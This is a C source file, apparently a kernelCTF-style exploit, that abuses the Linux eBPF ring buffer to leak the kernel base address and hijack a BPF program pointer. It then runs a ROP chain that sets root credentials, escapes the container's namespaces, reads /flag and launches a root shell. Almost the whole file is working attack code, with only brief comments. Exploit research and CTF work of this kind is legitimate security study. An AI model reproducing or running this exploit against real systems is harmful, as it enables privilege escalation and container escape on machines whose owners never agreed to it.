#define _GNU_SOURCE

#include <arpa/inet.h>
#include <endian.h>
#include <errno.h>
#include <fcntl.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <netinet/in.h>
#include <sched.h>
#include <setjmp.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <time.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <assert.h>
#include <sys/inotify.h>
#include <err.h>
#include <pthread.h>

#include <linux/filter.h>
#include <linux/bpf.h>
#include "bpf_insn.h"


#include "kernelver_17412.294.62.h"

static char *g_mmapped_buf;
static uint64_t g_kernel_text;

void get_kctf_flag()
{
        char buf[512];


        int fd = open("/flag", O_RDONLY);

        if (fd < 0)
                return;

        size_t n = read(fd, buf, sizeof(buf));
        if (n > 0) {
                printf("Flag:\n");

                write(1, buf, n);

                printf("\n");
        }

        close(fd);
}

static char *g_sh_argv[] = {"sh", NULL};

static int g_status;

#define MMAP_SIZE 0x2000

static int g_pwned;

#define KOFFSET(x) (x-0xffffffff81000000uL)

uint64_t kaddr(uint64_t addr)
{
        return g_kernel_text + addr - 0xffffffff81000000uL;
}

void __attribute__((naked)) after_pwn()
{
// Fix user stack and recover eflags since we didn't do when returning from kernel mode
        asm volatile(
                "mov %0, %%rsp\n"
                :: "r" (g_mmapped_buf + MMAP_SIZE - 0x100)
        );

        g_pwned = 1;


        int pid = fork();

        if (!pid) {

        if (setns(open("/proc/1/ns/mnt", O_RDONLY), 0) < 0)
                perror("setns");

        setns(open("/proc/1/ns/pid", O_RDONLY), 0);
        setns(open("/proc/1/ns/net", O_RDONLY), 0);

        printf("\nGot root!!!\n");
        printf("Getting kctf flags ...\n");

        get_kctf_flag();

        printf("Launching shell, system will crash when you exit because I didn't bother with recovery ...\n");
        execve("/bin/sh", g_sh_argv, NULL);
        _exit(0);
        }

        waitpid(pid, &g_status, 0);

       

        printf("Shell exited, sleeping for 30 seconds, after that system might crash\n");

        sleep(30);
        _exit(0);
}



#define LOG_BUF_SIZE 655360
char bpf_log_buf[LOG_BUF_SIZE];

static __u64 ptr_to_u64(void *ptr)
{
	return (__u64) (unsigned long) ptr;
}

int bpf_prog_load(enum bpf_prog_type prog_type,
		  const struct bpf_insn *insns, int prog_len,
		  const char *license, int kern_version)
{
	union bpf_attr attr = {
		.prog_type = prog_type,
		.insns = ptr_to_u64((void *) insns),
		.insn_cnt = prog_len / sizeof(struct bpf_insn),
		.license = ptr_to_u64((void *) license),
		.log_buf = ptr_to_u64(bpf_log_buf),
		.log_size = LOG_BUF_SIZE,
		.log_level = 1,
	};

	attr.kern_version = kern_version;

	bpf_log_buf[0] = 0;

	return syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));
}

int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size,
		   int max_entries)
{
	union bpf_attr attr = {
		.map_type = map_type,
		.key_size = key_size,
		.value_size = value_size,
		.max_entries = max_entries
	};

	return syscall(__NR_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));
}

int load_prog(struct bpf_insn *prog, size_t sz)
{
        int fd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, prog, sz, "GPL", 0);
        if (fd < 0) {
                puts(bpf_log_buf);
                err(1, "prog load");
        }

        return fd;
}

uint64_t g_data_in[64];
char g_ctx_in[sizeof(struct __sk_buff)];
char g_ctx_out[sizeof(struct __sk_buff)];

int bpf_test_run(int prog_fd)
{

        union bpf_attr attr = {
                .test.prog_fd = prog_fd,
                .test.ctx_size_in = sizeof(g_ctx_in),
                .test.ctx_in = ptr_to_u64(g_ctx_in),
                .test.ctx_size_out = sizeof(g_ctx_out),
                .test.ctx_out = ptr_to_u64(g_ctx_out),
                .test.data_size_in = sizeof(g_data_in),
                .test.data_in = ptr_to_u64(g_data_in),
                .test.flags = 0,
                .test.cpu = 0
        };


        int ret = syscall(__NR_bpf, BPF_PROG_TEST_RUN, &attr, sizeof(attr));
        if (ret < 0)
                err(1, "test_run");

        return attr.test.retval;
}

size_t prepare_rop(uint64_t *rop2)
{
        uint64_t *rop2_start = rop2;

        *rop2++ = kaddr(POP_RDI);
        *rop2++ = kaddr(INIT_CRED);
        *rop2++ = kaddr(COMMIT_CREDS); // 0x10

        // Namespace escape based on code by Crusaders of Rust
        *rop2++ = kaddr(POP_RDI); 
        *rop2++ = 1; // 0x20
        *rop2++ = kaddr(FIND_TASK_BY_VPID);
        *rop2++ = kaddr(MOV_RAX_RDI); // 0x30


        *rop2++ = kaddr(POP_RSI);
        *rop2++ = kaddr(INIT_NSPROXY); // 0x40

        *rop2++ = kaddr(SWITCH_TASK_NAMESPACES);

        *rop2++ = kaddr(POP_R11_R10_R9_R8_RDI_RSI_RDX_RCX); // 0x50
// eflags
        *rop2++ = 0;
        rop2 += 6;

        *(uint64_t *) ((char *) rop2_start + 0x66) = kaddr(POP_RSP);

// Userspace RIP
        *rop2++ = (uint64_t) after_pwn;

        *rop2++ = kaddr(RETURN_VIA_SYSRET);

        return (char *) rop2 - (char *) rop2_start;
}

int main(int argc, char **argv)
{
        setbuf(stdout, NULL);

        g_mmapped_buf = mmap(NULL, MMAP_SIZE, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE|MAP_POPULATE, -1, 0);
        if (g_mmapped_buf == MAP_FAILED) {
                perror("mmap");
                return 1;
        }

        memset(g_mmapped_buf, 0, MMAP_SIZE);

        struct bpf_insn empty_prog[] = {
		BPF_MOV64_IMM(BPF_REG_0, 0),
		BPF_EXIT_INSN() 
        };


// Allocate some programs to consume pages from the cache and get to fresh memory with consecutive addresses
        for (int i = 0; i < 100; i++)
        {
                load_prog(empty_prog, sizeof(empty_prog));
        }


        int ring_map = bpf_create_map(BPF_MAP_TYPE_RINGBUF, 0, 0, 0x2000);
        int ring_map2 = bpf_create_map(BPF_MAP_TYPE_RINGBUF, 0, 0, 0x2000);

        if (ring_map < 0 || ring_map2 < 0)
                err(1, "create_map ringbuf");

        int stage4_fd = load_prog(empty_prog, sizeof(empty_prog));
 
        unsigned int ctx_offset = 0x30;

        struct bpf_insn stage1_prog[] = {
	        BPF_LD_MAP_FD(BPF_REG_1, ring_map),
		BPF_MOV64_IMM(BPF_REG_2, 0x10),
		BPF_MOV64_IMM(BPF_REG_3, 0),
                BPF_CALL_FUNC(BPF_FUNC_ringbuf_reserve),

                BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
                BPF_EXIT_INSN(),    

                BPF_MOV64_REG(BPF_REG_1, BPF_REG_0),
                BPF_ALU64_IMM(BPF_SUB, BPF_REG_1, 0x2fd0),
		BPF_MOV64_IMM(BPF_REG_2, 1),
                BPF_CALL_FUNC(BPF_FUNC_ringbuf_discard),

		BPF_MOV64_IMM(BPF_REG_0, 0),
		BPF_EXIT_INSN() 
        };

        struct bpf_insn stage2_prog[] = {
                BPF_MOV64_REG(BPF_REG_6, BPF_REG_1),
	        BPF_LD_MAP_FD(BPF_REG_1, ring_map),
		BPF_MOV64_IMM(BPF_REG_2, 0x6000),
		BPF_MOV64_IMM(BPF_REG_3, 0),
                BPF_CALL_FUNC(BPF_FUNC_ringbuf_reserve),

                BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
                BPF_EXIT_INSN(),    

                BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),

		BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_7, 0x4fe0 + 0x28),
		BPF_STX_MEM(BPF_DW, BPF_REG_6, BPF_REG_1, ctx_offset),

                BPF_MOV64_REG(BPF_REG_1, BPF_REG_7),
		BPF_MOV64_IMM(BPF_REG_2, 1),
                BPF_CALL_FUNC(BPF_FUNC_ringbuf_discard),

		BPF_MOV64_IMM(BPF_REG_0, 6),
		BPF_EXIT_INSN() 
        };

        struct bpf_insn stage3_prog[] = {
// reg_6 - ctx
// reg_7 - ringbuf mem
                BPF_MOV64_REG(BPF_REG_6, BPF_REG_1),

	        BPF_LD_MAP_FD(BPF_REG_1, ring_map),
		BPF_MOV64_IMM(BPF_REG_2, 0x20000),
		BPF_MOV64_IMM(BPF_REG_3, 0),
                BPF_CALL_FUNC(BPF_FUNC_ringbuf_reserve),

                BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
                BPF_EXIT_INSN(),    

                BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),

// bpf_func
		BPF_LDX_MEM(BPF_DW, BPF_REG_2, BPF_REG_6, ctx_offset),
                BPF_MOV64_REG(BPF_REG_1, BPF_REG_7),
                BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, 0xcfd8 + 0x30),
		BPF_STX_MEM(BPF_DW, BPF_REG_1, BPF_REG_2, 0),

// copy rop
                BPF_MOV64_REG(BPF_REG_1, BPF_REG_6),
		BPF_MOV64_IMM(BPF_REG_2, 0),
                BPF_MOV64_REG(BPF_REG_3, BPF_REG_7),
                BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, 0xcfd8 + 0x48),
		BPF_MOV64_IMM(BPF_REG_4, 0x100),

                BPF_CALL_FUNC(BPF_FUNC_skb_load_bytes),

                BPF_MOV64_REG(BPF_REG_1, BPF_REG_7),
		BPF_MOV64_IMM(BPF_REG_2, 1),
                BPF_CALL_FUNC(BPF_FUNC_ringbuf_discard),

		BPF_MOV64_IMM(BPF_REG_0, 6),
		BPF_EXIT_INSN() 
        };

        bpf_test_run(load_prog(stage1_prog, sizeof(stage1_prog)));
        bpf_test_run(load_prog(stage2_prog, sizeof(stage2_prog)));

        g_kernel_text = *(uint64_t *) (g_ctx_out + ctx_offset) - (BPF_RINGBUF_NOTIFY - 0xffffffff81000000);

        printf("Leaked kernel base: 0x%lx\n", g_kernel_text);

        *(uint64_t *) (g_ctx_in + ctx_offset) = kaddr(PUSH_RSI_JMP_QWORD_RSI_066);

        prepare_rop((uint64_t *) ((char *) g_data_in + 14));

        bpf_test_run(load_prog(stage3_prog, sizeof(stage3_prog)));

        bpf_test_run(stage4_fd);

// Can't exit, everything might crash
        while (1) 
                sleep(1000);

        return 0;
}
